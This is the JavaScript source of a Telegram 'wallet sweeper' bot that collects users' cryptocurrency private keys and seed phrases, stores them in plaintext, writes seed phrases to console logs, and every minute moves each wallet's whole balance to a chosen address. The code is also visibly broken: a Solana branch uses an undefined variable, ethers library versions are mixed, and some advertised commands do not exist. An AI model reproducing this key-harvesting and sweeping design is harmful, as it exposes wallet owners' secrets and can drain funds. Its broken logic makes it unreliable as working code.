require("dotenv").config();
const TelegramBot = require("node-telegram-bot-api");
const { db } = require("./db/db");
const { wallets, transactions, users } = require("./db/schema");
const { eq } = require("drizzle-orm");
const { TronWeb } = require("tronweb");
const bitcoin = require("bitcoinjs-lib");
const ecc = require("tiny-secp256k1");
const { ECPairFactory } = require("ecpair");
const bip39 = require("bip39");
const hdkey = require("hdkey");
const solanaWeb3 = require("@solana/web3.js");
const ed25519HdKey = require("ed25519-hd-key");
const bs58 = require("bs58");
const { ethers } = require("ethers");
const WalletConnect = require("@walletconnect/client").default;

const ECPair = ECPairFactory(ecc);

// Supported derivation paths for BTC
const supportedBTCPaths = [
  "m/44'/0'/0'/0/0",   // Legacy (P2PKH)
  "m/49'/0'/0'/0/0",   // SegWit (P2SH)
  "m/84'/0'/0'/0/0",   // Native SegWit (bech32)
];

// Create Telegram bot instance
const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: true });

// Global userStates for interactive wallet setup
const userStates = new Map();

// Store WalletConnect connectors
const walletConnectors = new Map();

//
// TELEGRAM BOT COMMANDS & FLOW
//

bot.setMyCommands([
  { command: "start", description: "Start the bot and get registered" },
  { command: "setwallet", description: "Add a new wallet for monitoring" },
  { command: "import", description: "Import wallet using WalletConnect" },
  { command: "listwallets", description: "View all your configured wallets" },
  { command: "checkbalance", description: "Check your wallet balance" },
  { command: "deletewallet", description: "Delete a configured wallet" }
]);

// /start: Registers the user.
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const username = msg.from.username || "Unknown";
  try {
    const existingUser = await db.select().from(users)
      .where(eq(users.telegramUserId, chatId.toString()))
      .then((res) => res[0]);
    if (!existingUser) {
      await db.insert(users).values({
        telegramUserId: chatId.toString(),
        telegramUsername: username,
      });
      bot.sendMessage(chatId, `✅ You have been registered for TRX transaction alerts!`);
    } else {
      bot.sendMessage(chatId, `⚡ You are already registered.`);
    }
    bot.sendMessage(
      chatId,
      "Welcome to the Neone Crypto Wallet Sweeper Bot! 🚀\n\n" +
      "I'll help you monitor your crypto wallets and automatically transfer funds when they reach your specified threshold.\n\n" +
      "Use the menu button (/) to see available commands, or click the button below:",
      {
        parse_mode: "Markdown",
        reply_markup: {
          keyboard: [["/start", "/setwallet"], ["/import", "/listwallets"], ["/checkbalance", "/deletewallet"]],
          resize_keyboard: true,
          one_time_keyboard: true,
        },
      }
    );
  } catch (error) {
    console.error("Error handling /start:", error);
    bot.sendMessage(chatId, "❌ An error occurred. Please try again.");
  }
});

// /import: Import wallet using WalletConnect
bot.onText(/\/import/, async (msg) => {
  const chatId = msg.chat.id;
  try {
    const user = await db.select().from(users)
      .where(eq(users.telegramUserId, chatId.toString()))
      .then((res) => res[0]);
    if (!user) return bot.sendMessage(chatId, "❌ Please use /start first.");
    
    // Set user state to waiting for WalletConnect data
    userStates.set(chatId, { step: "waiting_walletconnect", data: {} });
    
    // Send message with WalletConnect button
    bot.sendMessage(
      chatId,
      "🔗 Connect your wallet using WalletConnect:",
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "🔗 Connect Wallet", web_app: { url: process.env.WEBAPP_URL || "https://your-domain.com/wc" } }]
          ]
        }
      }
    );
  } catch (error) {
    console.error("Error handling /import:", error);
    bot.sendMessage(chatId, "❌ An error occurred. Please try again.");
  }
});

// Handle web_app_data from WalletConnect
bot.on("message", async (msg) => {
  // Handle web_app_data from WalletConnect
  if (msg.web_app_data) {
    const chatId = msg.chat.id;
    const state = userStates.get(chatId);
    
    if (state && state.step === "waiting_walletconnect") {
      try {
        // Parse the data from WalletConnect
        const data = JSON.parse(msg.web_app_data.data);
        const { account, chainId } = data;
        
        if (!account || !chainId) {
          return bot.sendMessage(chatId, "❌ Invalid wallet data received. Please try again.");
        }
        
        // Map chainId to blockchain name
        let blockchain = "ETH"; // Default to ETH
        if (chainId === 1) blockchain = "ETH"; // Ethereum Mainnet
        else if (chainId === 56) blockchain = "BSC"; // Binance Smart Chain
        else if (chainId === 137) blockchain = "MATIC"; // Polygon
        else if (chainId === 42161) blockchain = "ARBITRUM"; // Arbitrum
        else if (chainId === 10) blockchain = "OPTIMISM"; // Optimism
        
        // Ask for receiver address
        state.step = "walletconnect_receiver";
        state.data = { account, chainId, blockchain };
        userStates.set(chatId, state);
        
        bot.sendMessage(
          chatId,
          `✅ Wallet connected successfully!\n\nAddress: \`${account}\`\nChain: ${blockchain}\n\nPlease enter the receiver address where funds should be sent:`,
          { parse_mode: "Markdown" }
        );
      } catch (error) {
        console.error("Error processing WalletConnect data:", error);
        bot.sendMessage(chatId, "❌ An error occurred while processing wallet data. Please try again.");
      }
      return;
    }
    
    // Handle receiver address for WalletConnect
    if (state && state.step === "walletconnect_receiver") {
      const receiverAddress = msg.text;
      
      // Validate receiver address based on blockchain
      let isValid = false;
      switch (state.data.blockchain) {
        case "ETH":
        case "BSC":
        case "MATIC":
        case "ARBITRUM":
        case "OPTIMISM":
          // Simple ETH address validation
          isValid = /^0x[a-fA-F0-9]{40}$/.test(receiverAddress);
          break;
        default:
          isValid = true; // Accept any address for unknown chains
      }
      
      if (!isValid) {
        return bot.sendMessage(chatId, "❌ Invalid receiver address. Please enter a valid address.");
      }
      
      try {
        // Get the user
        const user = await db.select().from(users)
          .where(eq(users.telegramUserId, chatId.toString()))
          .then((res) => res[0]);
        
        if (!user) {
          return bot.sendMessage(chatId, "❌ User not found. Please use /start first.");
        }
        
        // Save the wallet to the database
        await db.insert(wallets).values({
          userId: user.id,
          blockchain: state.data.blockchain,
          privateKey: "", // No private key for WalletConnect
          address: state.data.account,
          threshold: 0, // Always set threshold to 0 to sweep entire balance
          receiverAddress: receiverAddress,
          walletConnectUri: "", // Will be updated when needed
        });
        
        // Clear user state
        userStates.delete(chatId);
        
        bot.sendMessage(
          chatId,
          `✅ Wallet imported successfully!\n\nBlockchain: ${state.data.blockchain}\nAddress: \`${state.data.account}\`\nReceiver: \`${receiverAddress}\``,
          { parse_mode: "Markdown" }
        );
      } catch (error) {
        console.error("Error saving WalletConnect wallet:", error);
        bot.sendMessage(chatId, "❌ An error occurred while saving your wallet. Please try again.");
      }
      return;
    }
  }
  
  // Handle regular messages for the old /setwallet flow
  const messageChatId = msg.chat.id;
  const messageState = userStates.get(messageChatId);
  if (!messageState) return;
  if (messageState.step === "key") {
    messageState.data.key = msg.text;
    messageState.step = "receiver";
    userStates.set(messageChatId, messageState);
    bot.sendMessage(messageChatId, "Please enter the receiver address where funds should be sent.");
  } else if (messageState.step === "receiver") {
    messageState.data.receiver = msg.text;
    try {
      await setupWallet(
        messageChatId,
        messageState.data.blockchain,
        messageState.data.key,
        messageState.data.receiver,
        0, // Always set threshold to 0 to sweep entire balance
        messageState.data.authMethod === "privateKey" ? "privateKey" : "seedPhrase"
      );
      userStates.delete(messageChatId);
    } catch (error) {
      bot.sendMessage(messageChatId, `❌ ${error.message}`);
    }
  }
});

//
// Wallet Setup Function – supports TRX, BTC, ETH, and SOL
//
async function setupWallet(chatId, blockchain, key, receiver, threshold, keyType) {
  const user = await db.select().from(users)
    .where(eq(users.telegramUserId, chatId.toString()))
    .then((res) => res[0]);
  if (!user) {
    return bot.sendMessage(chatId, "❌ Please use /start command first to register.");
  }
  let address;
  switch (blockchain) {
    case "TRX": {
      const tronWeb = new TronWeb({
        fullHost: "https://api.trongrid.io",
        ...(keyType === "privateKey" ? { privateKey: key } : {}),
      });
      address =
        keyType === "privateKey"
          ? tronWeb.address.fromPrivateKey(key)
          : (await tronWeb.createAccountWithMnemonic(key)).address.base58;
      break;
    }
    case "BTC":
      try {
        const network = bitcoin.networks.bitcoin;
        let keyPair;
        if (keyType === "privateKey") {
          const cleanKey = key.trim().toLowerCase().replace("0x", "");
          if (cleanKey.length === 64 && /^[0-9a-f]{64}$/.test(cleanKey)) {
            keyPair = ECPair.fromPrivateKey(Buffer.from(cleanKey, "hex"), { network });
          } else if (cleanKey.length === 51 || cleanKey.length === 52) {
            try {
              keyPair = ECPair.fromWIF(cleanKey, network);
            } catch (e) {
              throw new Error("Invalid private key format. Please provide a valid hex private key or WIF format.");
            }
          } else {
            throw new Error("Invalid private key format. Please provide a valid hex private key (64 characters) or WIF format.");
          }
        } else {
          const normalizedKey = key.trim().replace(/\s+/g, " ").toLowerCase();
          const words = normalizedKey.split(" ");
          console.log(`Seed phrase received, word count: ${words.length}`);
          console.log(`Normalized seed phrase: ${normalizedKey}`);
          if (words.length !== 12 && words.length !== 24) {
            throw new Error(
              "Invalid seed phrase length.\n• Must be exactly 12 or 24 words\n• Words must be separated by single spaces"
            );
          }
          if (!bip39.validateMnemonic(normalizedKey)) {
            console.error("Normalized seed phrase:", normalizedKey);
            throw new Error("Invalid seed phrase. Please check your words and try again.");
          }
          let derived = null;
          const seed = bip39.mnemonicToSeedSync(normalizedKey);
          const root = hdkey.fromMasterSeed(seed);
          for (const path of supportedBTCPaths) {
            try {
              const child = root.derive(path); // Using derive() from hdkey
              if (child.privateKey) {
                const { address: derivedAddress } = bitcoin.payments.p2pkh({
                  pubkey: Buffer.from(child.publicKey),
                  network,
                });
                if (derivedAddress) {
                  derived = {
                    keyPair: ECPair.fromPrivateKey(child.privateKey, { network }),
                    derivationPath: path,
                    address: derivedAddress,
                  };
                  console.log(`Derived BTC wallet via ${path}: ${derivedAddress}`);
                  break;
                }
              }
            } catch (err) {
              console.error(`Error deriving path ${path}:`, err);
              continue;
            }
          }
          if (!derived) {
            throw new Error("Unsupported wallet derivation path or unknown seed phrase type.");
          }
          keyPair = derived.keyPair;
        }
        const { address: btcAddress } = bitcoin.payments.p2pkh({
          pubkey: Buffer.from(keyPair.publicKey),
          network,
        });
        if (!btcAddress) throw new Error("Failed to generate BTC address");
        address = btcAddress;
        key = keyPair.toWIF();
      } catch (error) {
        console.error("BTC wallet creation error:", error);
        throw new Error("Failed to create BTC wallet: " + error.message);
      }
      break;
    case "ETH":
      try {
        let walletObj;
        if (keyType === "privateKey") {
          // Expect a hex string (without 0x) for ETH private keys.
          walletObj = new ethers.Wallet(key);
        } else {
          const normalizedKey = key.trim().replace(/\s+/g, " ");
          if (!bip39.validateMnemonic(normalizedKey)) {
            throw new Error("Invalid seed phrase for ETH. Please check and try again.");
          }
          // Use ethers.js v6 API for creating wallet from mnemonic
          const hdNode = ethers.HDNodeWallet.fromMnemonic(normalizedKey);
          walletObj = hdNode;
        }
        address = walletObj.address;
        key = walletObj.privateKey; // Store as plain hex (with 0x prefix)
      } catch (error) {
        console.error("ETH wallet creation error:", error);
        throw new Error("Failed to create ETH wallet: " + error.message);
      }
      break;
    case "SOL":
      try {
        const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"), "confirmed");
        // Convert hex private key to Uint8Array
        const privateKeyBytes = new Uint8Array(Buffer.from(wallet.privateKey, 'hex'));
        const keyPair = solanaWeb3.Keypair.fromSecretKey(privateKeyBytes);
        const balanceLamports = await connection.getBalance(keyPair.publicKey);
        if (balanceLamports <= 0) return;
        const fee = 5000; // approximate fee in lamports
        const amountToSendLamports = balanceLamports - fee;
        if (amountToSendLamports <= 0) return;
        const transaction = solanaWeb3.SystemProgram.transfer({
          fromPubkey: keyPair.publicKey,
          toPubkey: new solanaWeb3.PublicKey(wallet.receiverAddress),
          lamports: amountToSendLamports,
        });
        transaction.feePayer = keyPair.publicKey;
        const { blockhash } = await connection.getRecentBlockhash();
        transaction.recentBlockhash = blockhash;
        transaction.sign(keyPair);
        const txid = await connection.sendRawTransaction(transaction.serialize());
        response = { result: true, txid };
      } catch (error) {
        console.error("Error processing SOL transaction:", error);
      }
      break;
    default:
      throw new Error("Unsupported blockchain");
  }

  if (!address) {
    throw new Error("Failed to generate wallet address");
  }

  await db.insert(wallets).values({
    userId: user.id,
    blockchain,
    privateKey: key,
    address,
    threshold: threshold || 1,
    receiverAddress: receiver,
  });

  bot.sendMessage(
    chatId,
    `✅ Wallet set up successfully!\n\nBlockchain: ${blockchain}\nAddress: \`${address}\``,
    { parse_mode: "Markdown" }
  );
}

// /checkbalance: Show balances for each wallet.
bot.onText(/\/checkbalance/, async (msg) => {
  const chatId = msg.chat.id;
  try {
    const user = await db.select().from(users)
      .where(eq(users.telegramUserId, chatId.toString()))
      .then((res) => res[0]);
    if (!user) return bot.sendMessage(chatId, "❌ Please use /start first.");
    const userWallets = await db.select().from(wallets)
      .where(eq(wallets.userId, user.id));
    if (userWallets.length === 0)
      return bot.sendMessage(chatId, "❌ No wallets found. Use /setwallet to add a wallet!");
    let message = "💰 *Wallet Balances:*\n\n";
    for (const wallet of userWallets) {
      if (wallet.blockchain === "TRX") {
        const tronWeb = new TronWeb({
          fullHost: "https://api.trongrid.io",
          privateKey: wallet.privateKey,
        });
        const balance = await tronWeb.trx.getBalance(wallet.address);
        message += `*Wallet ${wallet.id}*\n`;
        message += `Address: \`${wallet.address}\`\n`;
        message += `Balance: ${balance / 1e6} TRX\n\n`;
      } else if (wallet.blockchain === "BTC") {
        try {
          const res = await fetch(`https://blockchain.info/unspent?active=${wallet.address}`);
          if (!res.ok) {
            message += `*Wallet ${wallet.id}*\nAddress: \`${wallet.address}\`\nBalance: 0 BTC (no UTXOs)\n\n`;
            continue;
          }
          const jsonData = await res.json();
          if (!jsonData.unspent_outputs || jsonData.unspent_outputs.length === 0) {
            message += `*Wallet ${wallet.id}*\nAddress: \`${wallet.address}\`\nBalance: 0 BTC (no UTXOs)\n\n`;
          } else {
            const balanceSats = jsonData.unspent_outputs.reduce((acc, utxo) => acc + utxo.value, 0);
            const balanceBtc = balanceSats / 1e8;
            message += `*Wallet ${wallet.id}*\n`;
            message += `Address: \`${wallet.address}\`\n`;
            message += `Balance: ${balanceBtc} BTC\n\n`;
          }
        } catch (error) {
          console.error("Error fetching BTC UTXOs:", error);
          message += `*Wallet ${wallet.id}*\nAddress: \`${wallet.address}\`\nBalance: Unknown (API error)\n\n`;
        }
      } else if (wallet.blockchain === "SOL") {
        try {
          const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"), "confirmed");
          const keyPair = solanaWeb3.Keypair.fromSecretKey(Uint8Array.from(bs58.decode(wallet.privateKey)));
          const balanceLamports = await connection.getBalance(keyPair.publicKey);
          const balanceSol = balanceLamports / solanaWeb3.LAMPORTS_PER_SOL;
          message += `*Wallet ${wallet.id}*\n`;
          message += `Address: \`${wallet.address}\`\n`;
          message += `Balance: ${balanceSol} SOL\n\n`;
        } catch (error) {
          console.error("Error fetching SOL balance:", error);
          message += `*Wallet ${wallet.id}*\nAddress: \`${wallet.address}\`\nBalance: Unknown (API error)\n\n`;
        }
      } else if (wallet.blockchain === "ETH") {
        try {
          const provider = ethers.getDefaultProvider();
          const balanceBN = await provider.getBalance(wallet.address);
          const balanceEth = ethers.utils.formatEther(balanceBN);
          message += `*Wallet ${wallet.id}*\n`;
          message += `Address: \`${wallet.address}\`\n`;
          message += `Balance: ${balanceEth} ETH\n\n`;
        } catch (error) {
          console.error("Error fetching ETH balance:", error);
          message += `*Wallet ${wallet.id}*\nAddress: \`${wallet.address}\`\nBalance: Unknown (API error)\n\n`;
        }
      } else {
        message += `*Wallet ${wallet.id}*\n`;
        message += `Blockchain: ${wallet.blockchain}\nStatus: Unsupported blockchain\n\n`;
      }
    }
    bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
  } catch (error) {
    console.error("Error checking balance:", error);
    bot.sendMessage(chatId, "❌ Failed to check balance.");
  }
});

// Function to check and send funds (sweeping) for TRX, BTC, SOL, and ETH wallets.
async function checkAndSendTRX(wallet) {
  try {
    let balance = 0;
    let amountToSend = 0;
    let response;
    
    // Check if this is a WalletConnect wallet (no private key)
    const isWalletConnect = !wallet.privateKey;
    
    switch (wallet.blockchain) {
      case "TRX": {
        const tronWeb = new TronWeb({
          fullHost: "https://api.trongrid.io",
          privateKey: wallet.privateKey,
        });
        balance = await tronWeb.trx.getBalance(wallet.address);
        if (balance > 0) {
          const estimatedFee = 100000;
          amountToSend = balance - estimatedFee;
          if (amountToSend <= 0) return;
          const transaction = await tronWeb.transactionBuilder.sendTrx(
            wallet.receiverAddress,
            amountToSend,
            wallet.address
          );
          const signedTransaction = await tronWeb.trx.sign(transaction);
          response = await tronWeb.trx.sendRawTransaction(signedTransaction);
        }
        break;
      }
      case "BTC":
        try {
          const network = bitcoin.networks.bitcoin;
          const keyPair = ECPair.fromWIF(wallet.privateKey, network);
          const utxoResponse = await fetch(`https://blockchain.info/unspent?active=${wallet.address}`);
          const utxoData = await utxoResponse.json();
          if (utxoData.unspent_outputs && utxoData.unspent_outputs.length > 0) {
            const utxos = utxoData.unspent_outputs;
            balance = utxos.reduce((acc, utxo) => acc + utxo.value, 0);
            if (balance > 0) {
              const feeRate = 10;
              const estimatedSize = 180;
              const fee = estimatedSize * feeRate;
              amountToSend = balance - fee;
              if (amountToSend <= 0) return;
              const psbt = new bitcoin.Psbt({ network });
              utxos.forEach((utxo) => {
                psbt.addInput({
                  hash: utxo.tx_hash_big_endian,
                  index: utxo.tx_output_n,
                  nonWitnessUtxo: Buffer.from(utxo.script, "hex"),
                });
              });
              psbt.addOutput({
                address: wallet.receiverAddress,
                value: amountToSend,
              });
              utxos.forEach((_, i) => {
                psbt.signInput(i, keyPair);
                psbt.validateSignaturesOfInput(i);
              });
              psbt.finalizeAllInputs();
              const tx = psbt.extractTransaction();
              const txHex = tx.toHex();
              const broadcastResponse = await fetch("https://blockchain.info/pushtx", {
                method: "POST",
                headers: { "Content-Type": "application/x-www-form-urlencoded" },
                body: `tx=${txHex}`,
              });
              if (broadcastResponse.ok) {
                response = { result: true, txid: tx.getId() };
              }
            }
          }
        } catch (error) {
          console.error("Error processing BTC transaction:", error);
        }
        break;
      case "SOL":
        try {
          const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"), "confirmed");
          // Convert hex private key to Uint8Array
          const privateKeyBytes = new Uint8Array(Buffer.from(wallet.privateKey, 'hex'));
          const keyPair = solanaWeb3.Keypair.fromSecretKey(privateKeyBytes);
          const balanceLamports = await connection.getBalance(keyPair.publicKey);
          if (balanceLamports <= 0) return;
          const fee = 5000; // approximate fee in lamports
          const amountToSendLamports = balanceLamports - fee;
          if (amountToSendLamports <= 0) return;
          const transaction = solanaWeb3.SystemProgram.transfer({
            fromPubkey: keyPair.publicKey,
            toPubkey: new solanaWeb3.PublicKey(wallet.receiverAddress),
            lamports: amountToSendLamports,
          });
          transaction.feePayer = keyPair.publicKey;
          const { blockhash } = await connection.getRecentBlockhash();
          transaction.recentBlockhash = blockhash;
          transaction.sign(keyPair);
          const txid = await connection.sendRawTransaction(transaction.serialize());
          response = { result: true, txid };
        } catch (error) {
          console.error("Error processing SOL transaction:", error);
        }
        break;
      case "ETH":
      case "BSC":
      case "MATIC":
      case "ARBITRUM":
      case "OPTIMISM": {
        try {
          if (isWalletConnect) {
            // For WalletConnect wallets, we need to establish a connection
            // This is a simplified example - in a real implementation, you would
            // need to handle session management, reconnection, etc.
            bot.sendMessage(
              wallet.userId,
              `⚠️ WalletConnect wallets require manual approval for transactions. Please use the /import command to reconnect your wallet when you want to sweep funds.`
            );
            return;
          } else {
            // Existing ETH code for private key wallets
            const provider = ethers.getDefaultProvider();
            const walletObj = new ethers.Wallet(wallet.privateKey, provider);
            const balanceBN = await provider.getBalance(walletObj.address);
            if (balanceBN.isZero()) return;
            const gasPrice = await provider.getGasPrice();
            const gasLimit = ethers.BigNumber.from("21000");
            const fee = gasPrice.mul(gasLimit);
            if (balanceBN.lt(fee)) return;
            const amountToSend = balanceBN.sub(fee);
            const tx = await walletObj.sendTransaction({
              to: wallet.receiverAddress,
              value: amountToSend
            });
            response = { result: true, txid: tx.hash };
          }
        } catch (error) {
          console.error("Error processing ETH transaction:", error);
        }
        break;
      }
      default:
        throw new Error("Unsupported blockchain");
    }
    
    if (response && response.result) {
      await db.insert(transactions).values({
        walletId: wallet.id,
        blockchain: wallet.blockchain,
        amount: amountToSend,
        status: "success",
        txHash: response.txid,
      });
      const user = await db.select().from(users)
        .where(eq(users.id, wallet.userId))
        .then((res) => res[0]);
      if (user) {
        const message = `🚀 *Transaction Alert!*\n\n✅ *${
          wallet.blockchain === "BTC" ? amountToSend / 1e8 :
          wallet.blockchain === "SOL" ? amountToSend / solanaWeb3.LAMPORTS_PER_SOL :
          wallet.blockchain === "ETH" ? ethers.utils.formatEther(amountToSend) :
          amountToSend / 1e6
        } ${wallet.blockchain}* sent to *${wallet.receiverAddress}*\n📌 *Tx Hash:* ${
          response.txid
        }\n\n🔗 [View on Explorer](${
          wallet.blockchain === "BTC"
            ? `https://blockchain.com/btc/tx/${response.txid}`
            : wallet.blockchain === "SOL"
            ? `https://explorer.solana.com/tx/${response.txid}?cluster=mainnet-beta`
            : wallet.blockchain === "ETH"
            ? `https://etherscan.io/tx/${response.txid}`
            : `https://tronscan.org/#/transaction/${response.txid}`
        })`;
        bot.sendMessage(user.telegramUserId, message, { parse_mode: "Markdown" });
      }
    }
  } catch (error) {
    console.error(`❌ Error processing ${wallet.blockchain} transaction:`, error.message);
  }
}

// Periodic check for TRX, BTC, SOL, and ETH wallets every 60 seconds
setInterval(async () => {
  const userWallets = await db.select().from(wallets);
  for (const wallet of userWallets) {
    if (["TRX", "BTC", "SOL", "ETH"].includes(wallet.blockchain)) {
      await checkAndSendTRX(wallet);
    }
  }
}, 60000);

// /deletewallet command – remove wallet and associated transactions
bot.onText(/\/deletewallet/, async (msg) => {
  const chatId = msg.chat.id;
  try {
    const user = await db.select().from(users)
      .where(eq(users.telegramUserId, chatId.toString()))
      .then((res) => res[0]);
    if (!user) return bot.sendMessage(chatId, "❌ Please use /start first.");
    const userWallets = await db.select().from(wallets)
      .where(eq(wallets.userId, user.id));
    if (userWallets.length === 0)
      return bot.sendMessage(chatId, "❌ No wallets found. Use /setwallet to add a wallet!");
    const keyboard = userWallets.map((wallet) => [
      {
        text: `Wallet ${wallet.id} (${wallet.address.slice(0, 8)}...)`,
        callback_data: `delete_wallet_${wallet.id}`,
      },
    ]);
    bot.sendMessage(chatId, "Select the wallet you want to delete:", {
      reply_markup: { inline_keyboard: keyboard },
    });
  } catch (error) {
    console.error("Error listing wallets for deletion:", error);
    bot.sendMessage(chatId, "❌ Failed to list wallets.");
  }
});

// Handle deletion callback queries.
bot.on("callback_query", async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const data = callbackQuery.data;
  if (data.startsWith("delete_wallet_")) {
    const walletId = parseInt(data.split("_")[2]);
    try {
      await db.delete(transactions).where(eq(transactions.walletId, walletId));
      await db.delete(wallets).where(eq(wallets.id, walletId));
      await bot.editMessageText("✅ Wallet deleted successfully!", {
        chat_id: chatId,
        message_id: callbackQuery.message.message_id,
        reply_markup: { inline_keyboard: [] },
      });
      bot.sendMessage(chatId, "The wallet has been removed from monitoring. Use /listwallets to see your remaining wallets.");
    } catch (error) {
      console.error("Error deleting wallet:", error);
      await bot.editMessageText("❌ Failed to delete wallet. Please try again.", {
        chat_id: chatId,
        message_id: callbackQuery.message.message_id,
        reply_markup: { inline_keyboard: [] },
      });
    }
  }
});

console.log("🔄 Neone Bot Activated");
